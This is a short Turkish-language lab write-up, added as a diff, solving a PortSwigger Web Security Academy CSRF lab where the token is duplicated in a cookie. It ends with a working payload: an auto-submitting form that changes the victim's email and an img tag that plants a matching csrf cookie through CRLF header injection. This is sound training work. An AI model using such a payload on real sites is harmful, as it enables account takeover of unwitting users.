@@ -1,0 +1,35 @@
+Lab: CSRF where token is duplicated in cookie
+
+url :https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-duplicated-in-cookie
+
+süreç:
+--burp aracında carlos hesabının mail değişim işlemini yakalayıp repeatera gönderdim ve analizi burda yürüttüm.
+
+gözlem:
+-- token ve cookie parametreleri ile desteklenmiş olduğunu fark ettim 
+-- post ve get metodlarının ikisinede  cooki ve tokenlar zorunlu kılınmış.
+-- yanlış token veya cookie kabul edilmiyor.
+-- csrf cookiesi ve tokeni oturuma entegre edilememiş . Oturumdan bağımsız değer alıyorlar .Ve bu noktada token ve cookie değeri aynı değerleri alıyor.
+-- token değeri ile cookie değerinin aynı olması durumunda email değişimi yapılabilir hale geliyor.
+
+Saldırı planı:
+
+-- Bir post methodu oluşturup bu methodun içine ana hesabımızda kullanılmadan yakalayacağımız cookie ve token değerleri kullanılarak
+istek yapılması ve hedefin mail adresinin değiştirilmesi
+
+payload:
+
+
+    Payloadın ilk kısımı zaten önceki lablarla aynı.Bu labda ise değişen şey bu senaryoda isteğin header kısmına bir cookie eklememiz gerekiyordu.
+bunu img tagı sayesinde ekledik .
+
+    İmg tagı sitediki arama kısmında aranan değerin bir cookie olarak eklendiğini fark edince set cooki ile yeni bir cookie oluşturmamzı sağlayan fırsat tanıdı bize.
+
+          <form method="POST" action="https://0ab700b0044683d381c8347900270064.web-security-academy.net/my-account/change-email">
+            <input type="hidden" name="email" value="hacked3@harbinger.cim" />
+            <input type="hidden" name="csrf" value="bXsYNYW2Y1umWDx9G6Tt6JztL9bDS561" />
+            <input type="submit" value="Submit request" />
+        </form>
+        <img src="https://0ab700b0044683d381c8347900270064.web-security-academy.net/?search=dark%0d%0aSet-Cookie:%20csrf=bXsYNYW2Y1umWDx9G6Tt6JztL9bDS561%3b%20SameSite=None"  onerror="document.forms[0].submit()">
+
+Payloadın amacı fake token ve cookie ile mail değiştirmektir.
